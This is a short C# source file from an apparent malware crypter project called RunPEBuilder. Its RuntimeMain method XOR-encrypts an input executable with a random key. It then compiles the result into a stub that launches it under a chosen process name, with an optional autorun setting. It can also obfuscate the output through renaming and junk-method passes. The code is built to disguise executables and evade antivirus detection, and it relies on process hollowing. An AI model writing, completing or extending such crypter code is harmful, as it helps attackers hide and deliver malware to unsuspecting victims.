using dnlib.DotNet;
using RunPEBuilder.RunSrc;
using System;
using System.IO;

namespace RunPEBuilder.Include
{
    internal class RuntimeEngine
    {
        public static string RuntimeMain(string InFile, string OutFile, string processName, bool obfuscate, bool AutoRun)
        {
            if (new FileInfo(InFile).Length == 0)
            {
                return $"Error: Input file {InFile} is empty.";
            }
            try
            {
                string XorKey = EncryptEngine.GenerateRandomXorKey(25);
                string AppBytes = EncryptEngine.EncryptFile(InFile, XorKey);

                bool isCompiled = CompileEngine.Compilate(AppBytes, processName, XorKey, OutFile, AutoRun);

                if (obfuscate)
                {
                    string tempFile = Path.Combine(Path.GetDirectoryName(OutFile), $"sample_{Path.GetFileName(OutFile)}");
                    File.Move(OutFile, tempFile);

                    using (var stream = new FileStream(tempFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        var module = ModuleDefMD.Load(stream);

                        RenameProtector.Execute(module, tempFile);
                        JunkMethods.Execute(module, tempFile);

                        module.Write(tempFile);
                    }

                    File.Move(tempFile, OutFile);
                }

                return "File built successfully!";
            }

            catch (Exception ex)
            {
                return $"Build Error: {ex.Message}";
            }
        }
    }
}
